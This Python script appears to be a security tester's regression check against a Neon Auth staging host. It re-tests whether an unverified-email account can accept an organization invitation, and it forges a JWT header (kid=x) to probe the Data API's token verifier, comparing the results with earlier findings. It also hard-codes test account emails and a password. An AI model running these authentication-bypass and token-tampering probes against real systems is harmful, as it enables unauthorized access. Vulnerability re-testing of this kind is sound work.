# -*- coding: utf-8 -*-
"""staging 行为 diff 锚点重测:
锚1(nauth): 未验证邮箱 accept-invitation 当时 200 accepted(GHSA-fmh4 形态,_n12 记录)
            -> 现在如果要求验证/403 = 该面被修复
锚2(Data API): JWT 篡改 kid=x 当时 400 "jwk not found"(_n7 记录)
            -> 错误信息变化 = 验证器改动
锚3(nauth org): create org 200 + invite 语义
流程: 重建 org 链(快) -> 对比 -> 清理
"""
import http.client, ssl, json, time, uuid

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
ORIGIN = 'http://localhost:3000'
PW = 'SecTest!2026pass2'
N12_EMAIL = 'libobo1229+secn12@gmail.com'

def login(email):
    conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
         'Content-Type': 'application/json', 'Origin': ORIGIN}
    conn.request('POST', '/neondb/auth/sign-in/email',
                 json.dumps({'email': email, 'password': PW}).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    conn.close()
    ck = ''
    for part in hdrs.get('set-cookie', '').split(','):
        kv = part.strip().split(';')[0]
        if '=' in kv:
            k, v = kv.split('=', 1)
            ck = ck + ('; ' if ck else '') + '%s=%s' % (k.strip(), v.strip())
    return st, ck

def req(cookie, method, path, body=None):
    try:
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Content-Type': 'application/json', 'Origin': ORIGIN, 'Cookie': cookie}
        conn.request(method, '/neondb/auth' + path,
                     body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        conn.close()
        return st, raw.decode('utf-8', 'replace')
    except Exception as e:
        return -1, 'EXC %s' % e

# ===== 锚1: 未验证 accept-invitation 重测 =====
print('=== 锚1: org 链(历史记录: 未验证 accept 200) ===', flush=True)
st, ck2 = login('libobo1229+na2@gmail.com')
st, ck12 = login(N12_EMAIL)
print('login na2=%d secn12=%d' % (st, st), flush=True)

slug = 'secdiff' + uuid.uuid4().hex[:5]
st, raw = req(ck2, 'POST', '/organization/create', {'name': slug, 'slug': slug})
print('create org -> %d %s' % (st, raw[:200]), flush=True)
org_id = None
try:
    org_id = json.loads(raw).get('id')
except Exception:
    pass
if not org_id:
    print('abort', flush=True)
else:
    st, raw = req(ck2, 'POST', '/organization/invite-member',
                  {'email': N12_EMAIL, 'role': 'member', 'organizationId': org_id})
    print('invite -> %d %s' % (st, raw[:200]), flush=True)
    inv_id = None
    try:
        inv_id = json.loads(raw).get('id')
    except Exception:
        pass
    if inv_id:
        # ★ diff 点: secn12(emailVerified=false) accept
        st, raw = req(ck12, 'POST', '/organization/accept-invitation', {'invitationId': inv_id})
        print('★ secn12(unverified) accept -> %d %s' % (st, raw[:300]), flush=True)
        print('  [历史 _n12 记录: 200 accepted -> 若现在 403/需验证 = 修复]', flush=True)
    # 清理
    st, raw = req(ck2, 'POST', '/organization/delete', {'organizationId': org_id})
    print('cleanup org -> %d %s' % (st, raw[:150]), flush=True)

# ===== 锚2: Data API JWT 篡改错误信息 =====
print('\n=== 锚2: Data API JWT 篡改(历史: kid=x -> 400 jwk not found) ===', flush=True)
try:
    st, raw = req(ck2, 'GET', '/token')
    print('GET /token -> %d %s' % (st, raw[:150]), flush=True)
    tok = None
    try:
        tok = json.loads(raw).get('token') or json.loads(raw).get('jwt') or json.loads(raw).get('access_token')
    except Exception:
        pass
    if not tok:
        # 试响应结构
        print('  raw:', raw[:400], flush=True)
    if tok:
        # 篡改 kid
        import base64
        def b64u(b):
            return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
        hdr, pay, sig = tok.split('.')
        h2 = b64u(b'{"alg":"EdDSA","kid":"x"}')
        fake = h2 + '.' + pay + '.' + sig
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
        hh = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
              'Authorization': 'Bearer ' + fake}
        conn.request('GET', '/neondb/rest/v1/', headers=hh)
        r = conn.getresponse()
        raw2 = r.read().decode('utf-8', 'replace')
        print('★ tampered kid=x -> %d %s' % (r.status, raw2[:300]), flush=True)
        print('  [历史 _n7 记录: 400 jwk not found -> 若变化 = 验证器改动]', flush=True)
        conn.close()
except Exception as e:
    print('dataapi ERR', e, flush=True)
